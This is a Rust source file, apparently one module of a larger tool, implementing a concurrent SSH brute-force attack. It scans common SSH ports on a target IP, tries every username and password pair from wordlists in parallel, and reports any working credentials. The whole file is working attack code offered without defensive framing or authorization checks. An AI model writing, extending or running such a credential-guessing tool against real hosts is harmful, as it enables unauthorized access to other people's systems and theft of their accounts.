// src/ssh.rs

use anyhow::{Context, Result};
use futures::stream::{FuturesUnordered, StreamExt};
use ssh2::Session;
use std::{
    net::TcpStream,
    sync::Arc,
    time::Duration,
};
use tokio::{task, time::sleep};
use crate::{events::BruteEvent, proxy};

const SSH_PORTS: &[u16] = &[22, 2222, 22222];
const CONNECT_TIMEOUT_SECS: u64 = 5;
const RETRY_DELAY_MS: u64 = 200;
const MAX_RETRIES: usize = 2;

/// Brute-force SSH for a single IP, returning events
pub async fn bruteforce_ip(
    ip: String,
    usernames: Arc<Vec<String>>,
    passwords: Arc<Vec<String>>,
) -> Vec<BruteEvent>
 {
    let mut events = Vec::new();
    let mut open_port = None;

    for &port in SSH_PORTS {
        if is_port_open(&ip, port).await {
            open_port = Some(port);
            events.push(BruteEvent::Info(format!("SSH port {} open on {}", port, ip)));
            break;
        }
    }

    let port = match open_port {
        Some(port) => port,
        None => {
            events.push(BruteEvent::Fail(format!("No open SSH port on {}", ip)));
            return events;
        }
    };

    let mut tasks = FuturesUnordered::new();

    for username in usernames.iter().cloned() {
        for password in passwords.iter().cloned() {
            let ip = ip.clone();
            let username = username.clone();
            let password = password.clone();
            tasks.push(task::spawn_blocking(move || {
                try_login(&ip, port, &username, &password)
            }));
        }
    }

    while let Some(result) = tasks.next().await {
        match result {
            Ok(Ok(success_string)) => {
                let parts: Vec<&str> = success_string.splitn(2, ':').collect();
                events.push(BruteEvent::Success {
                    protocol: "SSH".to_string(),
                    ip: ip.clone(),
                    username: parts[0].to_string(),
                    password: parts[1].to_string(),
                    port,
                });
                return events;
            }
            Ok(Err(e)) => events.push(BruteEvent::Error(e.to_string())),
            Err(e) => events.push(BruteEvent::Error(format!("Join error: {}", e))),
        }
    }

    events.push(BruteEvent::Fail(format!("SSH brute-force failed on {}", ip)));
    events
}

async fn is_port_open(ip: &str, port: u16) -> bool {
    let ip = ip.to_string(); // clone it inside
    tokio::task::spawn_blocking(move || TcpStream::connect_timeout(
        &format!("{}:{}", ip, port).parse().unwrap(),
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
    ))
    .await
    .map(|r| r.is_ok())
    .unwrap_or(false)
}


fn try_login(ip: &str, port: u16, user: &str, pass: &str) -> Result<String> {
    for attempt in 1..=MAX_RETRIES {
        match TcpStream::connect_timeout(
            &format!("{}:{}", ip, port).parse().unwrap(),
            Duration::from_secs(CONNECT_TIMEOUT_SECS),
        ) {
            Ok(stream) => {
                let mut sess = Session::new()?;
                sess.set_tcp_stream(stream);
                sess.handshake()?;

                if sess.userauth_password(user, pass).is_ok() && sess.authenticated() {
                    return Ok(format!("{}:{}", user, pass));
                } else {
                    return Err(anyhow::anyhow!("SSH auth failed"));
                }
            }
            Err(e) => {
                if attempt < MAX_RETRIES {
                    std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
                } else {
                    return Err(anyhow::anyhow!("Connection error: {}", e));
                }
            }
        }
    }
    Err(anyhow::anyhow!("Max retries reached"))
}

